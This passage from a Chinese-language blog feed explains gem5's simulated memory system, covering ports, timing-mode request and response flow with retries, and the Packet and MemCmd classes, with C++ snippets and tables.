class="hljs-keyword">private</span>:<br>        <span class="hljs-comment">/** Address of the cache block for this list of targets. */</span><br>        Addr blkAddr;<br>    <br>        <span class="hljs-comment">/** Size of the cache block. */</span><br>        Addr blkSize;<br>    <br>        <span class="hljs-comment">/** Indicates whether we can merge incoming write requests */</span><br>        <span class="hljs-type">bool</span> canMergeWrites;<br>    <br>        <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> std::vector&lt;bool&gt; might not meet satisfy the</span><br>        <span class="hljs-comment">// ForwardIterator requirement and therefore cannot be used</span><br>        <span class="hljs-comment">// for writesBitmap.</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">          * Track which bytes are written by requests in this target</span><br><span class="hljs-comment">          * list.</span><br><span class="hljs-comment">          */</span><br>        std::vector&lt;<span class="hljs-type">char</span>&gt; writesBitmap;<br>    &#125;;<br>    <span class="hljs-comment">/** A list of MSHRs. */</span><br>    <span class="hljs-keyword">typedef</span> std::list&lt;MSHR *&gt; List;<br>    <span class="hljs-comment">/** MSHR list iterator. */</span><br>    <span class="hljs-keyword">typedef</span> List::iterator Iterator;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Pointer to this MSHR on the ready list.</span><br><span class="hljs-comment">     * @sa MissQueue, MSHRQueue::readyList</span><br><span class="hljs-comment">     */</span><br>    Iterator readyIter;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Pointer to this MSHR on the allocated list.</span><br><span class="hljs-comment">     * @sa MissQueue, MSHRQueue::allocatedList</span><br><span class="hljs-comment">     */</span><br>    Iterator allocIter;<br><br>    <span class="hljs-comment">/** List of all requests that match the address */</span><br>    TargetList targets;<br><br>    TargetList deferredTargets;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="WriteBuffer">WriteBuffer</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WriteQueueEntry</span> : <span class="hljs-keyword">public</span> QueueEntry, <span class="hljs-keyword">public</span> Printable &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">TargetList</span> : <span class="hljs-keyword">public</span> std::list&lt;Target&gt; &#123;<br>      <span class="hljs-keyword">public</span>:<br>        <span class="hljs-built_in">TargetList</span>() &#123;&#125;<br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(PacketPtr pkt, Tick readyTime, Counter order)</span></span>;<br>        <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">trySatisfyFunctional</span><span class="hljs-params">(PacketPtr pkt)</span></span>;<br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(std::ostream &amp;os, <span class="hljs-type">int</span> verbosity,</span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-type">const</span> std::string &amp;prefix)</span> <span class="hljs-type">const</span></span>;<br>    &#125;;<br>    <span class="hljs-comment">/** A list of write queue entriess. */</span><br>    <span class="hljs-keyword">typedef</span> std::list&lt;WriteQueueEntry *&gt; List;<br>    <span class="hljs-comment">/** WriteQueueEntry list iterator. */</span><br>    <span class="hljs-keyword">typedef</span> List::iterator Iterator;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">sendPacket</span><span class="hljs-params">(BaseCache &amp;cache)</span> <span class="hljs-keyword">override</span></span>;<br><br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/** Pointer to this entry on the ready list.</span><br><span class="hljs-comment">     * @sa MissQueue, WriteQueue::readyList</span><br><span class="hljs-comment">     */</span><br>    Iterator readyIter;<br><br>    <span class="hljs-comment">/** Pointer to this entry on the allocated list.</span><br><span class="hljs-comment">     * @sa MissQueue, WriteQueue::allocatedList</span><br><span class="hljs-comment">     */</span><br>    Iterator allocIter;<br><br>    <span class="hljs-comment">/** List of all requests that match the address */</span><br>    TargetList targets;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cpp</tag>
      
      <tag>gem5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解 Gem5 之四</title>
    <link href="/2022/04/02/2022-4-2-gem5-4/"/>
    <url>/2022/04/02/2022-4-2-gem5-4/</url>
    
    <content type="html"><![CDATA[<h1>Gem5 中的内存系统</h1><p>本文部分内容参考官方文档中<a href="https://www.gem5.org/documentation/general_docs/memory_system/">关于内存系统的相关说明</a>，<a href="https://www.gem5.org/documentation/learning_gem5/part2/memoryobject/">内存系统中创建 SimObjects</a></p><h2 id="MemObjects">MemObjects</h2><p>之前的 gem5 版本中，所有连接到内存系统的对象都派生于 MemObject 类。然而，在最新版本（v21.0.1.0）中，该类被删去了。</p><p>那么现在用什么类呢？猜测是 SimObject</p><h2 id="Ports">Ports</h2><p>在深入研究内存系统之前，我们应该首先理解 gem5 中的端口类 Port。因为所有在内存系统内的对象都要通过端口来建立连接，因而它们总是成对出现，这使得 gem5 的设计更加模块化。</p><h3 id="memory-system-modes">memory system modes</h3><p>Port 类实现了三种不同的内存系统模式：时序（timing）、原子（Atomic）和功能（functional），最重要的模式是时序模式。时序模式是产生正确仿真结果的唯一模式。其他模式仅在特殊情况下使用：</p><ol><li>Atomic mode 原子模式常用于快进到感兴趣的模拟区域，以及预热缓存，这种模式假设在内存系统中不会产生任何事件。相反，所有的内存请求都通过一个长调用链执行。除非它将在快进或模拟器预热期间使用，否则不需要实现对内存对象的原子访问。</li><li>Functional mode 功能模式更适合描述为调试模式。功能模式用于从 host 读取数据到模拟器内存等操作。它在 Syscall Emulation(SE) 模式中被大量使用。例如，函数模式使用 <code>process.cmd</code> 从 host 中加载二进制文件，这样模拟系统就可以访问它。不论数据在何处，函数的读操作总能返回最新的数据，而其写操作中需要更新所有可能的有效数据（比如多个有效的缓存块中）。</li></ol><h3 id="Port">Port</h3><p>Port 类（端口）是 SimObject 之间的交互接口。在 gem5 中，Port 类是所有交互接口类（包括网络连接以及硬件模块端口连接等）的父类，其地位可见一斑。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Port</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">const</span> std::string portName;<br>    <span class="hljs-type">const</span> PortID id;<br>    Port *_peer;<br>    <span class="hljs-type">bool</span> _connected;<br>  <span class="hljs-keyword">protected</span>:<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UnboundPortException</span> &#123;&#125;;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Port</span>(<span class="hljs-type">const</span> std::string&amp; _name, PortID _id)<br>      : <span class="hljs-built_in">portName</span>(_name), <span class="hljs-built_in">id</span>(_id), _peer(<span class="hljs-literal">nullptr</span>), _connected(<span class="hljs-literal">false</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>portName 是端口的描述名，id 类型为 <code>typename int16_t PortID</code>，用于在 vector 中区分并识别端口，当 id 为负数时，指示端口不在 vector 中。_peer 指向与该端口相连的端口，_connected 表示端口是否有一个端口与之相连。此外，Port 类中还定义了一个空类 UnboundPortException，用于在程序发现未绑定端口时 throw 出特定的错误。</p><p>成对的两个端口如何进行绑定与解绑呢？很简单，只需要改变 _peer 指针就行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/** Attach to a peer port. */</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">bind</span><span class="hljs-params">(Port &amp;peer)</span> </span>&#123;<br>  _peer = &amp;peer;<br>  _connected = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/** Dettach from a peer port. */</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">unbind</span><span class="hljs-params">()</span> </span>&#123;<br>  _peer = <span class="hljs-literal">nullptr</span>;<br>  _connected = <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>takeOverFrom()</code> 函数也提供了快速交换两个端口之间连接的方法。它将原本与 old 绑定的端口绑定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">takeOverFrom</span><span class="hljs-params">(Port *old)</span> </span>&#123;<br>  Port &amp;peer = old-&gt;<span class="hljs-built_in">getPeer</span>();<br>  <span class="hljs-comment">// Disconnect the original binding.</span><br>  old-&gt;<span class="hljs-built_in">unbind</span>();<br>  peer.<span class="hljs-built_in">unbind</span>();<br>  <span class="hljs-comment">// Connect the new binding.</span><br>  peer.<span class="hljs-built_in">bind</span>(*<span class="hljs-keyword">this</span>);<br>  <span class="hljs-built_in">bind</span>(peer);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Master-vs-Slave-Request-vs-Response">Master-vs-Slave ? Request-vs-Response !</h3><p>Port 类分别派生出了两种不同的子类，RequestPort 类和 ResponsePort 类。其中，RequsetPort 类是请求端口，用于发送接受请求，RespondPort 则用于发送应答。<strong>在之前的版本中，RequestPort 被称为 MasterPort，而 RespondPort 被称为 SlavePort</strong>，且官方文档中仍旧使用这些名称，为方便统一，下文使用 RequestPort 和 ResponsePort。一个主模块，如 CPU，通常有一个或多个 RequestPort 实例，从 Cache 中请求想要的数据。从模块，例如内存，具有一个或多个 ResponsePort，响应请求发回对应的数据。一个互连组件，例如缓存、网桥或总线，通常同时具有 RequestPort 和 ResponsePort 实例。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPort</span>: <span class="hljs-keyword">public</span> Port, <span class="hljs-keyword">public</span> AtomicRequestProtocol,<br>    <span class="hljs-keyword">public</span> TimingRequestProtocol, <span class="hljs-keyword">public</span> FunctionalRequestProtocol &#123;<br>  <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponsePort</span>;<br>  <span class="hljs-keyword">private</span>:<br>    ResponsePort *_responsePort;<br>  <span class="hljs-keyword">protected</span>:<br>    SimObject &amp;owner;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponsePort</span> : <span class="hljs-keyword">public</span> Port, <span class="hljs-keyword">public</span> AtomicResponseProtocol,<br>    <span class="hljs-keyword">public</span> TimingResponseProtocol, <span class="hljs-keyword">public</span> FunctionalResponseProtocol &#123;<br>  <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPort</span>;<br>  <span class="hljs-keyword">private</span>:<br>    RequestPort* _requestPort;<br>    <span class="hljs-type">bool</span> defaultBackdoorWarned;<br>  <span class="hljs-keyword">protected</span>:<br>    SimObject&amp; owner;<br>&#125;<br></code></pre></td></tr></table></figure><p>以 RequestPort 类为例，RequestPort 类中包含了指向应答端口的指针 _responsePort 和拥有该请求端口的 SimObject。它还继承了三个不同级别的传输协议类：AtomicRequestProtocol、TimingRequestProtocol 和 FunctionalRequestProtocol。除了发送数据包的基本功能外，它还可以更改接收范围和侦听（snoop）端口的功能。</p><h3 id="时序传输数据流程">时序传输数据流程</h3><p>时序模式下传输数据在 gem5 中非常常见，因此我们先来了解一下时序模式下的数据传输实现。gem5 中的数据传输，都是靠 Packet 类来完成。因此不论是 send 还是 recv 函数，都需要传递 Packet 类指针：PacketPtr。</p><p>当主模块需要下游传来数据时，会通过 RequestPort 调用 <code>sendTimingReq(pkt)</code> 发送请求， pkt 是 Packet 的指针，内含有请求数据、应执行的指令、状态等。然而实际上 <code>sendTimingReq(pkt)</code> 的实现就是调用 <code>peer-&gt;recvTimingReq(pkt)</code> 并返回该函数的返回值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">RequestPort::sendTimingReq</span><span class="hljs-params">(PacketPtr pkt)</span> </span>&#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">return</span> TimingRequestProtocol::<span class="hljs-built_in">sendReq</span>(_responsePort, pkt);<br>  &#125; <span class="hljs-built_in">catch</span> (UnboundPortException) &#123;<br>    <span class="hljs-built_in">reportUnbound</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TimingRequestProtocol::sendReq</span><span class="hljs-params">(TimingResponseProtocol *peer, PacketPtr pkt)</span> </span>&#123;<br>    <span class="hljs-built_in">assert</span>(pkt-&gt;<span class="hljs-built_in">isRequest</span>());<br>    <span class="hljs-keyword">return</span> peer-&gt;<span class="hljs-built_in">recvTimingReq</span>(pkt);<br>&#125;<br></code></pre></td></tr></table></figure><p>于是，PacketPtr 通过函数参数的方式传给了 RespondPort，而 RespondPort 事实上是处于从模块中，所以现在数据就移动到了下游从模块。注意，<code>recvTimingReq()</code> 的返回值给最终会 return 到 <code>sendTimingReq</code> 函数中。因此主模块可以知晓请求是否被从模块接收，true 表示该数据包已被收到。false 意味着从模块目前无法接收请求，必须在未来的某个时刻重试。</p><p>若 RespondPort 成功接收了 PacketPtr，此时主模块会继续自己的运行，从模块则会处理 Packet，双方都不会被阻塞。当从模块完成处理后，需向主模块发送响应：调用 <code>sendTimingResp(pkt)</code>（此时 pkt 是与请求相同的指针，但它现在指向一个响应包）。类似的是，<code>sendTimingResp(pkt)</code> 内部实现还是直接调用 <code>peer-&gt;recvTimingResp(pkt)</code> 并返回该函数的返回值。若 master 的 <code>recvTimingResp()</code> 函数返回 true，表明 master 已经收到应答，如此一来，该请求的交互就完成了（见下图）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">sendTimingResp</span><span class="hljs-params">(PacketPtr pkt)</span> </span>&#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">return</span> TimingResponseProtocol::<span class="hljs-built_in">sendResp</span>(_requestPort, pkt);<br>  &#125; <span class="hljs-built_in">catch</span> (UnboundPortException) &#123;<br>    <span class="hljs-built_in">reportUnbound</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TimingResponseProtocol::sendResp</span><span class="hljs-params">(TimingRequestProtocol *peer, PacketPtr pkt)</span> </span>&#123;<br>  <span class="hljs-built_in">assert</span>(pkt-&gt;<span class="hljs-built_in">isResponse</span>());<br>  <span class="hljs-keyword">return</span> peer-&gt;<span class="hljs-built_in">recvTimingResp</span>(pkt);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/gem5/gem5-4-M2S.PNG" alt=""></p><p>之前说的都是非常顺利的情况，若出现从模块因某些原因暂无法接收。那么 <code>recvTimingReq()</code> 的返回值为 false，于是主模块会得知从模块正在忙碌，当从模块可以接受数据后，会调用 <code>sendReqRetry()</code> 函数来通知主模块再次发送请求。而主模块也只有在等到 <code>recvReqRetry()</code> 执行后，才能再次调用 <code>sendTimingReq()</code> 函数来发送请求。当然，第二次发送请求失败也是有可能的，因此上述过程可能会发生很多次。注意：主模块负责保存失败的 PacketPtr，而不是从模块，从模块不保留失败的 PacketPtr。</p><p><img src="/img/gem5/gem5-4-M2SR.PNG" alt=""></p><p>当然，也可能出现主模块因忙碌而无法接收应答的情况，从模块通过 <code>sendTimingResp</code> 的返回值可知应答未被主模块接收，那么从模块需要等待主模块调用 <code>sendRespRetry()</code> 函数，然后才能再次发送应答。</p><p><img src="/img/gem5/gem5-4-M2SRR.PNG" alt=""></p><p>最后，补上官方文档中关于时序数据流控制的说明：</p><blockquote><p>当 <code>sendTiming()</code> 函数返回 false 时，相同的 Packet 就不应当再次发送，直到 <code>recvRetry()</code> 函数被调用时，才可以再次调用 <code>sendTiming()</code> 函数，然而此时也不必一定要重发之前的 Packet，可以发送一个优先级更高的 Packet。Once sendTiming() returns true, the packet may still not be able to make it to its destination. For packets that require a response (i.e. pkt-&gt;needsResponse() is true), any memory object can refuse to acknowledge the packet by changing its result to Nacked and sending it back to its source. However, if it is a response packet, this can not be done. The true/false return is intended to be used for local flow control, while nacking is for global flow control. In both cases a response can not be nacked.</p></blockquote><h2 id="Packet">Packet</h2><h3 id="简介">简介</h3><p>如上文所述，Packet 类通常表示内存对象之间传输的数据。因此，单个 Request 从请求者一直传输到最终目的地，然后再返回，可能是由几个不同 Packet 在这个过程中传输的。</p><p>各种类中的 accessor 函数可以访问并使用 Packet 类中的信息，并进而验证读入的数据是否有效。比如，在 SimpleCache 的例子中，<code>accessFunctional()</code> 函数内使用了 Packet 类的地址、块大小、读/写操作等信息：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 在cache中根据块的首地址 找出对应的块做读写操作</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SimpleCache::accessFunctional</span><span class="hljs-params">(PacketPtr pkt)</span> </span>&#123;<br>  Addr block_addr = pkt-&gt;<span class="hljs-built_in">getBlockAddr</span>(blockSize);<br>  <span class="hljs-keyword">auto</span> it = cacheStore.<span class="hljs-built_in">find</span>(block_addr);<br>  <span class="hljs-keyword">if</span> (it != cacheStore.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-keyword">if</span> (pkt-&gt;<span class="hljs-built_in">isWrite</span>()) &#123;<br>      <span class="hljs-comment">// Write the data into the block in the cache</span><br>      pkt-&gt;<span class="hljs-built_in">writeDataToBlock</span>(it-&gt;second, blockSize);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pkt-&gt;<span class="hljs-built_in">isRead</span>()) &#123;<br>      <span class="hljs-comment">// Read the data out of the cache block into the packet</span><br>      pkt-&gt;<span class="hljs-built_in">setDataFromBlock</span>(it-&gt;second, blockSize);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;Unknown packet type!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Packet-类">Packet 类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Packet</span> : <span class="hljs-keyword">public</span> Printable &#123;<br><span class="hljs-keyword">private</span>:<br>  Flags flags;        <span class="hljs-comment">// 标志位</span><br>  PacketDataPtr data; <span class="hljs-comment">// 指向被传输数据的指针</span><br><span class="hljs-keyword">public</span>:<br>  MemCmd cmd;         <span class="hljs-comment">// 包内要求内存对象执行的命令</span><br>  <span class="hljs-type">const</span> PacketId id;  <span class="hljs-comment">// 包 ID</span><br>  RequestPtr req;     <span class="hljs-comment">// 指向原本请求的指针</span><br>  Addr addr;          <span class="hljs-comment">// 请求的地址，虚拟地址或物理地址</span><br>  <span class="hljs-type">unsigned</span> size;      <span class="hljs-comment">// 请求的大小</span><br>  <span class="hljs-type">uint32_t</span> headerDelay; <span class="hljs-comment">// 从看到包到发送报头的额外延迟。这个延迟是用来传递交叉转发延迟到相邻的对象(例如缓存)，实际上使数据包等待。</span><br>  <span class="hljs-type">uint32_t</span> snoopDelay;  <span class="hljs-comment">// 在向内存系统发送请求之前，跟踪由向上窥探引起的额外延迟。这被相干交叉条用来解释额外的请求延迟。</span><br>  <span class="hljs-type">uint32_t</span> payloadDelay; <span class="hljs-comment">// 从看到数据包到负载结束的额外流水线延迟。这包括报头延迟。与报头延迟类似，这是用来弥补交叉条不会使包等待的事实。</span><br><br>  SenderState *senderState; <span class="hljs-comment">// 此数据包的发送者状态。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中 Printable 类是为更方便调试、打印信息而存在的抽象类。</p><p>而 Flags 类描述了 Packet 对象内具体状态信息，包括侦听、拷贝、应答、共享、有效位等：</p><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>COPY_FLAGS</td><td>Flags to transfer across when copying a packet</td></tr><tr><td>RESPONDER_FLAGS</td><td>used to create reponse packets</td></tr><tr><td>HAS_SHARERS</td><td>packet have sharers (which means it should not be considered writable) or not.</td></tr><tr><td>EXPRESS_SNOOP</td><td>Special timing-mode atomic snoop for multi-level coherence.</td></tr><tr><td>RESPONDER_HAD_WRITABLE</td><td>Allow a responding cache to inform the cache hierarchy that it had a writable copy before responding.</td></tr><tr><td>CACHE_RESPONDING</td><td>Snoop co-ordination flag to indicate that a cache is responding to a snoop.</td></tr><tr><td>WRITE_THROUGH</td><td>The writeback/writeclean</td></tr><tr><td>SATISFIED</td><td>Response co-ordination flag for cache maintenance</td></tr><tr><td>FAILS_TRANSACTION</td><td>Indicates that this packet/request has returned from the cache hierarchy in a failed transaction.</td></tr><tr><td>FROM_TRANSACTION</td><td>Indicates that this packet/request originates in the CPU executing in transactional mode</td></tr><tr><td>VALID_ADDR</td><td>addr valid fields</td></tr><tr><td>VALID_SIZE</td><td>size valid fields</td></tr><tr><td>STATIC_DATA</td><td>The data pointers to a value that shouldn’t be freed when the packet is destroyed.</td></tr><tr><td>DYNAMIC_DATA</td><td>The data pointers to a value that should be freed when the packet is destroyed.</td></tr><tr><td>SUPPRESS_FUNC_ERROR</td><td>suppress the error if this packet encounters a functional access failure.</td></tr><tr><td>BLOCK_CACHED</td><td>Signal block present to squash prefetch and cache evict packets through express snoop flag</td></tr></tbody></table><h4 id="Memcmd">Memcmd</h4><p>MemCmd 类定义了与命令相关的属性和其他数据。MemCmd 类中有所有关于cache/memory 的操作和属性。关于cache的命令操作，可分为以下几大类：</p><ul><li>无效</li><li>读取</li><li>预取</li><li>写入</li><li>清除</li><li>升级</li><li>同步</li></ul><p>这些命令操作也会配上<strong>数据包</strong>的属性，且命令与数据通常有固定搭配，不完全举例如下：</p><table><thead><tr><th>命令</th><th>属性字符</th><th>应答命令</th><th>描述</th></tr></thead><tbody><tr><td>InvalidCmd</td><td>-</td><td>InvalidCmd（即不应答）</td><td>无效命令</td></tr><tr><td>ReadReq</td><td>IsRead, IsRequest, NeedsResponse</td><td>ReadResp</td><td>由非缓存代理（例如 CPU 或设备）发出的读取，对对齐没有限制</td></tr><tr><td>ReadResp</td><td>IsRead, IsResponse, HasData</td><td>InvalidCmd</td><td>从 requester 到 responder 的数据流</td></tr><tr><td>ReadRespWithInvalidate</td><td>IsRead, IsResponse, HasData, IsInvalidate</td><td>InvalidCmd</td><td>是否是要升级的数据</td></tr><tr><td>WriteReq</td><td>IsWrite, NeedsWritable, IsRequest, NeedsResponse, HasData</td><td>WriteResp</td><td></td></tr><tr><td>WriteResp</td><td>IsWrite, IsResponse</td><td>InvalidCmd</td><td></td></tr><tr><td>WriteCompleteResp</td><td>IsWrite, IsResponse</td><td>InvalidCmd</td><td></td></tr><tr><td>WritebackDirty</td><td>IsWrite, IsRequest, IsEviction, HasData, FromCache</td><td>InvalidCmd</td><td></td></tr><tr><td>WritebackClean</td><td>IsWrite, IsRequest, IsEviction, HasData, FromCache</td><td>InvalidCmd</td><td></td></tr><tr><td>WriteClean</td><td>IsWrite, IsRequest, HasData, FromCache</td><td>InvalidCmd</td><td></td></tr><tr><td>CleanEvict</td><td>IsRequest, IsEviction, FromCache</td><td>InvalidCmd</td><td></td></tr><tr><td>SoftPFReq</td><td>IsRead, IsRequest, IsSWPrefetch, NeedsResponse</td><td>SoftPFResp</td><td></td></tr><tr><td>SoftPFExReq</td><td>IsRead, NeedsWritable, IsInvalidate, IsRequest, IsSWPrefetch, NeedsResponse</td><td>SoftPFResp</td><td></td></tr><tr><td>HardPFReq</td><td>IsRead, IsRequest, IsHWPrefetch, NeedsResponse, FromCache</td><td>HardPFResp</td><td></td></tr><tr><td>SoftPFResp</td><td>IsRead, IsResponse, IsHWPrefetch, HasData</td><td>InvalidCmd</td><td></td></tr><tr><td>HardPFResp</td><td>IsRead, IsResponse, IsHWPrefetch, HasData</td><td>InvalidCmd</td><td></td></tr><tr><td>WriteLineReq</td><td>IsWrite, NeedsWritable, IsRequest, NeedsResponse, HasData</td><td>WriteResp</td><td></td></tr><tr><td>UpgradeReq</td><td>IsInvalidate, NeedsWritable, IsUpgrade, IsRequest, NeedsResponse, FromCache</td><td>UpgradeResp</td><td></td></tr><tr><td>SCUpgradeReq</td><td>IsInvalidate, NeedsWritable, IsUpgrade, IsLlsc, IsRequest, NeedsResponse, FromCache</td><td>UpgradeResp</td><td>IsUpgrade, IsResponse</td></tr><tr><td>SCUpgradeFailReq</td><td>sRead, NeedsWritable, IsInvalidate, IsLlsc, IsRequest, NeedsResponse, FromCache</td><td>UpgradeFailResp</td><td></td></tr><tr><td>UpgradeFailResp</td><td>IsRead, IsResponse, HasData</td><td>InvalidCmd</td><td></td></tr><tr><td>ReadExReq</td><td>IsRead, NeedsWritable, IsInvalidate, IsRequest, NeedsResponse, FromCache</td><td>ReadExResp</td><td></td></tr><tr><td>ReadExResp</td><td>IsRead, IsResponse, HasData</td><td>InvalidCmd</td><td></td></tr><tr><td>ReadCleanReq</td><td>IsRead, IsRequest, NeedsResponse, FromCache</td><td>ReadResp</td><td></td></tr><tr><td>ReadSharedReq</td><td>IsRead, IsRequest, NeedsResponse, FromCache</td><td>ReadResp</td><td></td></tr><tr><td>LoadLockedReq</td><td>IsRead, IsLlsc, IsRequest, NeedsResponse</td><td></td><td></td></tr><tr><td>StoreCondReq</td><td>sWrite, NeedsWritable, IsLlsc, IsRequest, NeedsResponse, HasData</td><td></td><td></td></tr><tr><td>StoreCondFailReq</td><td>IsWrite, NeedsWritable, IsLlsc, IsRequest, NeedsResponse, HasData</td><td></td><td></td></tr><tr><td>StoreCondResp</td><td>IsWrite, IsLlsc, IsResponse</td><td></td><td></td></tr><tr><td>SwapReq</td><td>IsRead, IsWrite, NeedsWritable, IsRequest, HasData, NeedsResponse</td><td></td><td></td></tr><tr><td>SwapResp</td><td>IsRead, IsWrite, IsResponse, 